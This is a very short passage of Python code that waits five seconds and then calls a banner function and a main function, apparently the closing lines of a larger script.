time.sleep(5)
banner()
main()
